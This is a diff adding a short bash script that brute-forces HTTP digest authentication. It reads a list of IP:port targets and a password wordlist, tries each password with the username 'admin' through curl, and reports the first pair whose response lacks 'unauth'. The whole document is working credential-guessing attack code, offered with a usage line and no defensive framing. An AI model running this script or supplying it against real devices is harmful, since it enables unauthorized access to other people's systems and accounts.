@@ -1,0 +1,27 @@
+#!/bin/bash
+
+# Check if the script has enough arguments
+if [ "$#" -ne 3 ]; then
+    echo "Usage: $0 <passwords_file> <ips_ports_file> <url_path>"
+    exit 1
+fi
+
+PASSWORDS_FILE=$1
+IPS_PORTS_FILE=$2
+URL_PATH=$3
+USERNAME="admin"
+
+# Loop through each IP and port
+cat "$IPS_PORTS_FILE" | while read IP_PORT; do
+    # Loop through each password
+    cat "$PASSWORDS_FILE" | while read PASSWORD; do
+        URL="http://$IP_PORT$URL_PATH"
+        # Perform the curl request with digest authentication
+        if curl -s "$URL" -c /tmp/cookie --digest -u "$USERNAME:$PASSWORD" | grep -qi "unauth"; then
+            continue
+        else
+            echo "[+] Found $USERNAME:$PASSWORD on $IP_PORT"
+            exit 0
+        fi
+    done
+done
